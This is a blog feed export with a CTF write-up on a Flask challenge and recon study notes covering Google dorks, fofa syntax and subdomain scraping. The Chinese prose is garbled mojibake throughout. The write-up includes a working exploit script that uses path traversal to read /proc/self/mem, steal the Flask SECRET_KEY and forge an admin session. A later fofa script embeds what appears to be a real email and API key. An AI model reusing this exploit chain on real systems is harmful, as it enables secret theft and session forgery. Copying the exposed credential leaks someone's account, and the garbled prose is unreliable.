function_">info</span>():</span><br><span class="line">filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end)) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line"><span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>: </span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br></pre></td></tr></table></figure><p>æƒ³è¦è®¿é—®åˆ°flag,éœ€è¦è®¿é—®&#x2F;adminå¹¶ä¸”ä¼ å…¥sessionä¸­çš„å‚æ•° admin&#x3D;1<br>ä½†æ˜¯sessionè¦è‡ªå·±ä¼ªé€ </p><p>çœ‹wpäº†è§£åˆ°</p><ol><li>pythonå­˜å‚¨å¯¹è±¡çš„ä½ç½®åœ¨å †ä¸Š</li><li>appæ˜¯ä¸ªFlaskå¯¹è±¡ï¼Œè€Œsecret keyåœ¨app.config[â€˜SECRET_KEYâ€™]ï¼Œè¯»å–&#x2F;proc&#x2F;self&#x2F;memå¾—åˆ°è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œè¿›è€Œè·å–åˆ°SECRET_KEY</li><li>ä¸è¿‡è¯»&#x2F;proc&#x2F;self&#x2F;memå‰è¦æ³¨æ„ï¼Œ&#x2F;proc&#x2F;self&#x2F;memå†…å®¹è¾ƒå¤šè€Œä¸”å­˜åœ¨ä¸å¯è¯»å†™éƒ¨åˆ†ï¼Œç›´æ¥è¯»å–ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼Œå› æ­¤éœ€è¦æ­é…&#x2F;proc&#x2F;self&#x2F;mapsè·å–å †æ ˆåˆ†å¸ƒï¼Œç»“åˆmapsçš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼<br>å¤§ä½¬çš„è¯»å–&#x2F;proc&#x2F;self&#x2F;maps+&#x2F;proc&#x2F;self&#x2F;mem+SECRET_KEYçš„è„šæœ¬</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#Edited by lx56@blog.lxscloud.top</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ast, sys</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:60014/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ­¤ç¨‹åºåªèƒ½è¿è¡ŒäºPython3ä»¥ä¸Š</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------session ä¼ªé€ ,å•ç‹¬ç”¨ä¹Ÿå¯ä»¥è€ƒè™‘è¿™ä¸ªåº“ï¼š https://github.com/noraj/flask-session-cookie-manager ----------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="comment">#Encode a Flask session cookie</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”±/proc/self/mapsè·å–å¯è¯»å†™çš„å†…å­˜åœ°å€ï¼Œå†æ ¹æ®è¿™äº›åœ°å€è¯»å–/proc/self/memæ¥è·å–secret key</span></span><br><span class="line">s_key = <span class="string">&quot;&quot;</span></span><br><span class="line">bypass = <span class="string">&quot;../..&quot;</span></span><br><span class="line"><span class="comment">#è¯·æ±‚fileè·¯ç”±è¿›è¡Œè¯»å–</span></span><br><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    <span class="comment">#åŒ¹é…æŒ‡å®šæ ¼å¼çš„åœ°å€</span></span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#è®¾ç½®èµ·å§‹å’Œç»“æŸä½ç½®å¹¶è¯»å–/proc/self/mem</span></span><br><span class="line">        res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#ç”¨åˆ°äº†ä¹‹å‰ç‰¹å®šçš„SECRET_KEYæ ¼å¼ã€‚å¦‚æœå‘ç°*abcdefghå­˜åœ¨å…¶ä¸­ï¼Œè¯´æ˜æˆåŠŸæ³„éœ²secretkey</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#æ­£åˆ™åŒ¹é…ï¼Œæœ¬é¢˜secret keyæ ¼å¼ä¸º32ä¸ªå°å†™å­—æ¯æˆ–æ•°å­—ï¼Œå†åŠ ä¸Š*abcdefgh</span></span><br><span class="line">            secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> secret_key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line">                s_key = secret_key[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾ç½®sessionä¸­adminçš„å€¼ä¸º1</span></span><br><span class="line">data = <span class="string">&#x27;&#123;&quot;admin&quot;:1&#125;&#x27;</span></span><br><span class="line"><span class="comment">#ä¼ªé€ session</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;session=&quot;</span> + FSCM.encode(s_key, data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#è¯·æ±‚adminè·¯ç”±</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = requests.get(url + <span class="string">&quot;admin&quot;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag is&quot;</span>, flag.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something error&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†å­¦ä¹ ä¸æ€»ç»“</title>
      <link href="/2023/07/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="1-ä¿¡æ¯æ”¶é›†-æ›´æ–°ä¸­"><a href="#1-ä¿¡æ¯æ”¶é›†-æ›´æ–°ä¸­" class="headerlink" title="1.ä¿¡æ¯æ”¶é›†(æ›´æ–°ä¸­)"></a>1.ä¿¡æ¯æ”¶é›†(æ›´æ–°ä¸­)</h1><h2 id="1-1ä¿¡æ¯æ”¶é›†æ¦‚è¿°"><a href="#1-1ä¿¡æ¯æ”¶é›†æ¦‚è¿°" class="headerlink" title="1.1ä¿¡æ¯æ”¶é›†æ¦‚è¿°"></a>1.1ä¿¡æ¯æ”¶é›†æ¦‚è¿°</h2><h3 id="1-1-1ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬è¦æ±‚"><a href="#1-1-1ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬è¦æ±‚" class="headerlink" title="1.1.1ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬è¦æ±‚"></a>1.1.1ä¿¡æ¯æ”¶é›†çš„åŸºæœ¬è¦æ±‚</h3><p>1.å…¨é¢:<br>å¯¹ç›®æ ‡æ‰€æœ‰çš„ä¸šåŠ¡å’Œéä¸šåŠ¡å­˜åœ¨ç‚¹è¿›è¡Œå…¨é¢çš„ä¿¡æ¯æ”¶é›†ã€‚</p><p>2.å‡†ç¡®:<br>å¯¹æ”¶é›†åˆ°çš„ä¿¡æ¯å°¤å…¶æ˜¯é‡è¦ä¿¡æ¯è¦å†ä¸‰ç¡®è®¤å…¶ä¿¡æ¯çš„å‡†ç¡®æ€§ã€‚</p><p>3.å¤±æ•ˆ:<br>æ³¨æ„ä¿¡æ¯äº§ç”Ÿæ—¶é—´å’Œæ‰‹æœºæ—¶é—´,æ˜¯å¦å…·æœ‰æ—¶é—´å·®,æ—¶é—´å·®èƒ½å¦æ¥å—ã€‚</p><p>4.æ¸…æ™°:<br>å¯¹äºæ”¶é›†åˆ°çš„ä¿¡æ¯è¦åšåˆ°é€»è¾‘æ¸…æ™°,èƒ½æ¸…æ¥šåˆ†è¾¨å‡ºå„ä¸ªæ”¶é›†åˆ°çš„ä¿¡æ¯ä¹‹é—´çš„é€»è¾‘å…³ç³»å’Œèµ„äº§ä¹‹é—´çš„ç›¸å¯¹ä½ç½®ã€‚</p><p>5.æ‹“æ­¥:<br>ä»¥ä¿¡æ¯èµ·ç‚¹ç”±ç‚¹åˆ°é¢ã€‚</p><h3 id="1-1-2-ä¿¡æ¯æœé›†æ³¨æ„ç‚¹"><a href="#1-1-2-ä¿¡æ¯æœé›†æ³¨æ„ç‚¹" class="headerlink" title="1.1.2.ä¿¡æ¯æœé›†æ³¨æ„ç‚¹"></a>1.1.2.ä¿¡æ¯æœé›†æ³¨æ„ç‚¹</h3><p>ä¿¡æ¯æœé›†åº•å±‚é€»è¾‘: é€šè¿‡å„ç§æ¸ é“å¯¹å·²å…¬å¼€æˆ–æœªå…¬å¼€çš„ä¿¡æ¯è¿›è¡Œæœé›†,å°½å¯èƒ½æœé›†è–„å¼±ç‚¹ã€‚</p><p>æ³¨æ„äº‹é¡¹:<br>1.é™ä½è¢«å‘ç°åº¦,æé«˜éšè”½æ€§ã€‚<br>2.ç»†å¿ƒï¼Œè€å¿ƒã€‚</p><h3 id="1-1-3æ”¶é›†ç›®æ ‡"><a href="#1-1-3æ”¶é›†ç›®æ ‡" class="headerlink" title="1.1.3æ”¶é›†ç›®æ ‡"></a>1.1.3æ”¶é›†ç›®æ ‡</h3><p>æœåŠ¡å™¨ip<br>åŸŸå<br>æ“ä½œç³»ç»Ÿ<br>webå®¹å™¨ tomcat<br>ç«¯å£<br>åè®® http https<br>cdn å¤šåœ°ï¼ˆå›½å¤–ï¼‰ping æŸ¥å†å²åŸŸåè§£æè®°å½•<a href="https://www.ip138.com/">https://www.ip138.com/</a> ä¸»ç«™ æµé‡â¼¤ æœ‰cdn â¼¦åŸŸåçš„ç«™ æµé‡â¼©ï¼Œæ²¡æœ‰cdn https è¯ä¹¦ </p><p>â½¤çš„ä»€ä¹ˆè¯­â¾” login.php index.jsp index.asp thinkphp<br>æ¡†æ¶ tp cms<br>æ•°æ®åº“ ä¸æ˜¯ç»å¯¹ï¼š phpâ€”â€”&gt;mysql å¼€å‘éš¾åº¦ä½ ä¸­â¼©å…¬å¸ mysqlå…è´¹ jspâ€”â€”&gt;oracle&#x2F;mysql oracle æ”¶è´¹â½½ä¸”å¾ˆè´µ æµé‡â¼¤çš„â¼¤å‹å…¬å¸ aspâ€”â€”&gt;sqlserver å¾®è½¯â¾ƒå®¶çš„ ï¼ˆsqlserverå †å æ³¨å…¥+xpcmdshellï¼‰<br>è´Ÿè½½å‡è¡¡<br>waf<br>ä»£ç æ³„éœ²:æ‰«ç›®å½•æ‰«åˆ°å¤‡ä»½æ–‡ä»¶<br>å¾®ä¿¡â¼©ç¨‹åº<br>ä¿¡ä»»åŸŸå<br>ç•Œé¢ä¸Šçš„js:çœ‹è°ƒç”¨è·¯å¾„ï¼Œæœ‰çš„ä¸æ˜¯è°ƒç”¨çš„æœ¬åœ°ï¼Œè°ƒç”¨çš„å…¶ä»–åŸŸåå¯èƒ½ä¹Ÿæ˜¯èµ„äº§<br>æ¥å£</p><h3 id="1-1-4ä¿¡æ¯æ”¶é›†åˆ†ç±»"><a href="#1-1-4ä¿¡æ¯æ”¶é›†åˆ†ç±»" class="headerlink" title="1.1.4ä¿¡æ¯æ”¶é›†åˆ†ç±»"></a>1.1.4ä¿¡æ¯æ”¶é›†åˆ†ç±»</h3><p>ä¿¡æ¯æœé›†ä¸»è¦åˆ†ä¸ºä¸¤ç±»:<br>1.è¢«åŠ¨ä¿¡æ¯æœé›†<br>2.ä¸»åŠ¨ä¿¡æ¯æœé›†</p><h2 id="1-2-ä¿¡æ¯æ”¶é›†æµç¨‹"><a href="#1-2-ä¿¡æ¯æ”¶é›†æµç¨‹" class="headerlink" title="1.2.ä¿¡æ¯æ”¶é›†æµç¨‹"></a>1.2.ä¿¡æ¯æ”¶é›†æµç¨‹</h2><h2 id="1-3-ä¿¡æ¯æ”¶é›†å·¥å…·ç¼–å†™ç¤ºä¾‹"><a href="#1-3-ä¿¡æ¯æ”¶é›†å·¥å…·ç¼–å†™ç¤ºä¾‹" class="headerlink" title="1.3.ä¿¡æ¯æ”¶é›†å·¥å…·ç¼–å†™ç¤ºä¾‹"></a>1.3.ä¿¡æ¯æ”¶é›†å·¥å…·ç¼–å†™ç¤ºä¾‹</h2><p>1.å­åŸŸåçˆ†ç ´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”¨æˆ·è¾“å…¥åŸŸå</span></span><br><span class="line">domain = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥åŸŸå:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">i = i*<span class="number">10</span></span><br><span class="line"><span class="comment">#ä»£ç†å¤´</span></span><br><span class="line">heads=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0(Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&#x27;https://cn.bing.com/search? q=site%3A&#x27;</span>+domain+<span class="string">&#x27;&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;pq=site%3Adgjy.net&amp;sc=2- 11&amp;sk=&amp;cvid=C1A7FC61462345B1A71F431E60467C43&amp;toHttps=1&amp;redig=3FEC4F2BE86247E8AE3BB965A6 2CD454&amp;pn=2&amp;first=&#123;&#125;&amp;FROM=PERE&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">html=requests.get(url,headers=heads)</span><br><span class="line">soup=BeautifulSoup(html.content,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">job_bt = soup.findAll(<span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> job_bt:</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(i.a.get(<span class="string">&#x27;href&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.fofaæŸ¥è¯¢</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> fofa </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">email, key = (<span class="string">&#x27;904945036@qq.com&#x27;</span>,<span class="string">&#x27;b4b5d6d0c4afae6a9cb82939f03b10b4&#x27;</span>) </span><br><span class="line"><span class="comment">#è¾“â¼Šemailå’Œkey </span></span><br><span class="line">client = fofa.Client(email, key) </span><br><span class="line"><span class="comment">#å°†emailå’Œkeyä¼ â¼Šfofa.Clientç±»è¿›â¾åˆå§‹åŒ–å’ŒéªŒè¯ï¼Œå¹¶å¾—åˆ°â¼€ä¸ªfofa clientå¯¹è±¡ </span></span><br><span class="line">query_str = raw_input(<span class="string">&#x27;è¯·è¾“â¼Šæ¡ä»¶&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span>(query_str) </span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>): </span><br><span class="line"><span class="comment">#ä»ç¬¬1â»šæŸ¥åˆ°ç¬¬50â»š </span></span><br><span class="line">data = client.get_data(query_str,page=page,fields=<span class="string">&quot;ip,port&quot;</span>) </span><br><span class="line"><span class="comment">#æŸ¥è¯¢ç¬¬pageâ»šæ•°æ®çš„ipå’Œç«¯â¼ </span></span><br><span class="line"><span class="keyword">for</span> ip,port <span class="keyword">in</span> data[<span class="string">&quot;results&quot;</span>]: </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%s,%s&quot;</span>%(ip,port) </span><br><span class="line"><span class="comment">#æ‰“å°å‡ºæ¯æ¡æ•°æ®çš„ipå’Œç«¯â¼```</span></span><br></pre></td></tr></table></figure><h1 id="2-è¢«åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#2-è¢«åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="2.è¢«åŠ¨ä¿¡æ¯æ”¶é›†"></a>2.è¢«åŠ¨ä¿¡æ¯æ”¶é›†</h1><h3 id="2-1åŸºæœ¬æµç¨‹"><a href="#2-1åŸºæœ¬æµç¨‹" class="headerlink" title="2.1åŸºæœ¬æµç¨‹"></a>2.1åŸºæœ¬æµç¨‹</h3><ol><li>ç¬¬ä¸‰â½…çš„ä¿¡æ¯æ”¶é›†æœºæ„æˆ–å¹³å°å·²ç»æ”¶é›†åˆ°â½¬æ ‡çš„ä¿¡æ¯ </li><li>ç¬¬ä¸‰â½…çš„ä¿¡æ¯æ”¶é›†æœºæ„æˆ–å¹³å°å°†ä¿¡æ¯å­˜å‚¨åœ¨æŸå¤„ </li><li>æ”»å‡»è€…ä»å­˜å‚¨ä¿¡æ¯çš„åœ°â½…æŸ¥è¯¢ä¿¡æ¯ </li><li>æ”»å‡»è€…å¾—åˆ°ç›¸åº”ä¿¡æ¯</li></ol><h3 id="2-2è¢«åŠ¨ä¿¡æ¯æ”¶é›†ä¼˜ç¼ºç‚¹"><a href="#2-2è¢«åŠ¨ä¿¡æ¯æ”¶é›†ä¼˜ç¼ºç‚¹" class="headerlink" title="2.2è¢«åŠ¨ä¿¡æ¯æ”¶é›†ä¼˜ç¼ºç‚¹"></a>2.2è¢«åŠ¨ä¿¡æ¯æ”¶é›†ä¼˜ç¼ºç‚¹</h3><p>1.ä¼˜ç‚¹:<br>    1.éšè”½æ€§é«˜,ä¸å®¹æ˜“è¢«å‘ç°<br>    2.æ”¶é›†çš„ä¿¡æ¯é‡å’Œè¦†ç›–é¢æ¯”è¾ƒå¤§<br>2.ç¼ºç‚¹<br>    1.æ”¶é›†åˆ°çš„ä¿¡æ¯å‡†ç¡®æ€§ä¸æ—¶æ•ˆæ€§ä¸é«˜<br>    2.æ— æ³•æ”¶é›†åˆ°æ•æ„Ÿæˆ–æœªå…¬å¼€ä¿¡æ¯</p><p>åº”ç”¨åœºæ™¯:é€šè¿‡è¢«åŠ¨ä¿¡æ¯æ”¶é›†è·å–ç›®æ ‡åŸºæœ¬è¦ç´ ï¼Œæ ¹æ®ä¿¡æ¯è¦ç´ åˆ¤æ–­ç›®æ ‡ç‰¹ç‚¹ä¸è–„å¼±ç‚¹</p><h3 id="2-3-å¸¸è§æ‰‹æ®µ"><a href="#2-3-å¸¸è§æ‰‹æ®µ" class="headerlink" title="2.3 å¸¸è§æ‰‹æ®µ"></a>2.3 å¸¸è§æ‰‹æ®µ</h3><h4 id="1-Googleè¯­æ³•"><a href="#1-Googleè¯­æ³•" class="headerlink" title="1.Googleè¯­æ³•"></a>1.Googleè¯­æ³•</h4><p><a href="https://www.google.com/">https://www.google.com</a><br>å¸¸ç”¨googleè¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: æŒ‡å®šç«™ç‚¹çš„å†…å®¹(åŸŸå)</span><br><span class="line">ä¾‹å¦‚site:edu.cn site:qq.com</span><br><span class="line"></span><br><span class="line">filetype:æœç´¢æŒ‡å®šçš„æ–‡ä»¶ç±»å‹(log,txt,rar,bak,pdf,xls,dat) </span><br><span class="line">ä¾‹å¦‚ filetype:pdf</span><br><span class="line"></span><br><span class="line">inurl: æœç´¢urlä¸­æœ‰æŒ‡å®šå†…å®¹çš„ç½‘é¡µ </span><br><span class="line">ä¾‹å¦‚ url:uploads æ–‡ä»¶ä¸Šä¼ </span><br><span class="line"></span><br><span class="line">intitle: ç½‘é¡µæ ‡é¢˜ä¸­å«æœ‰å…³é”®å­—</span><br><span class="line">ä¾‹å¦‚ intitle:æ³›å¾®</span><br><span class="line"></span><br><span class="line">intext:ç½‘é¡µä¸­æ­£æ–‡å«æœ‰å…³é”®å­—</span><br><span class="line">ä¾‹å¦‚ intext:ç”¨æˆ·å/å¯†ç /ç™»å½•</span><br><span class="line"></span><br><span class="line">cache:</span><br><span class="line">å·²ç»åˆ é™¤çš„ç¼“å­˜ç½‘é¡µï¼Œå¯èƒ½æœ‰ä¿¡æ¯ </span><br></pre></td></tr></table></figure><p>Googleè¯­æ³•æŸ¥è¯¢å¯¹åº”æ¼æ´database<br><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><h4 id="2-ç½‘ç»œç©ºé—´æœç´¢å¼•æ“è¯­æ³•åŠåŸºæœ¬ä½¿ç”¨"><a href="#2-ç½‘ç»œç©ºé—´æœç´¢å¼•æ“è¯­æ³•åŠåŸºæœ¬ä½¿ç”¨" class="headerlink" title="2.ç½‘ç»œç©ºé—´æœç´¢å¼•æ“è¯­æ³•åŠåŸºæœ¬ä½¿ç”¨"></a>2.ç½‘ç»œç©ºé—´æœç´¢å¼•æ“è¯­æ³•åŠåŸºæœ¬ä½¿ç”¨</h4><p>å¸¸ç”¨æ¨è</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fofa:      https://fofa.info/</span><br><span class="line">é¹°å›¾:      https://hunter.qianxin.com/</span><br><span class="line">zoomeye:   https://www.zoomeye.org/</span><br><span class="line">360 quake  https://quake.360.net/quake/#/index</span><br><span class="line"></span><br><span class="line">censys:    https://search.censys.io/</span><br><span class="line">shodan:    https://www.shodan.io/</span><br><span class="line">onyphe:    https://www.onyphe.io/</span><br></pre></td></tr></table></figure><p>fofaä¸ºä¾‹<br>fofaå¸¸ç”¨:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;abc&quot;    æ ‡é¢˜ä¸­å­˜åœ¨abcçš„ç«™ç‚¹</span><br><span class="line">header=&quot;abc&quot;   httpå¤´ä¸­å­˜åœ¨abcçš„ç«™ç‚¹</span><br><span class="line">body=&quot;abc&quot;     htmlæ­£æ–‡ä¸­å­˜åœ¨abcçš„ç«™ç‚¹</span><br><span class="line">domain=&quot;qq.com&quot;æœç´¢æ ¹åŸŸåå¸¦æœ‰qq.comçš„ç«™ç‚¹</span><br><span class="line">host=&quot;login&quot;   ä»urlä¸­æœç´¢åŸŸåå¸¦æœ‰logihçš„ç«™ç‚¹</span><br><span class="line">port=&quot;443&quot;     æŸ¥æ‰¾å¯¹åº”443ç«¯å£çš„èµ„äº§</span><br><span class="line">ip=&quot;1.1.1.1&quot;   ä»ipæœç´¢åŒ…å«1.1.1.1çš„ç½‘ç«™,æœç´¢è¦ç”¨ipä½œä¸ºåç§°</span><br><span class="line">protocol=&quot;https&quot; æœç´¢æŒ‡å®šåè®®ç±»å‹</span><br><span class="line">city=&quot;Hangzhou&quot;  æœç´¢æŒ‡å®šåŸå¸‚çš„èµ„äº§</span><br><span class="line">region=&quot;Zhejiang&quot;æœç´¢è¡Œæ”¿åŒºçš„èµ„äº§</span><br><span class="line">country=&quot;CN&quot;    æœç´¢æŒ‡å®šå›½å®¶(ç¼–ç çš„èµ„äº§)</span><br><span class="line">cert=&quot;baidu&quot;    æœç´¢è¯ä¹¦ä¸­åŒ…å«baiduçš„èµ„äº§</span><br><span class="line">ip_country=&quot;Hangzhou&quot; æœç´¢æŒ‡å®šåŸå¸‚ipçš„èµ„äº§</span><br></pre></td></tr></table></figure><p>é«˜çº§æœç´¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨ () &amp;&amp; || !=</span><br></pre></td></tr></table></figure><p>æ¨èä½¿ç”¨å·¥å…· fofa_view<br>é¡¹ç›®åœ°å€:<a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a><br>é…ç½®ç›¸å…³ä¿¡æ¯åå³å¯ä½¿ç”¨<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307192108553.png"></p><h4 id="3-ä¼ä¸šä¿¡æ¯æ”¶é›†"><a href="#3-ä¼ä¸šä¿¡æ¯æ”¶é›†" class="headerlink" title="3.ä¼ä¸šä¿¡æ¯æ”¶é›†"></a>3.ä¼ä¸šä¿¡æ¯æ”¶é›†</h4><p>å›½å†…:<br>å¤©çœ¼æŸ¥<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>çˆ±ä¼æŸ¥<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a><br>å°è“æœ¬<a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a><br>ä¼æŸ¥æŸ¥<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>å¯ä¿¡å®<a 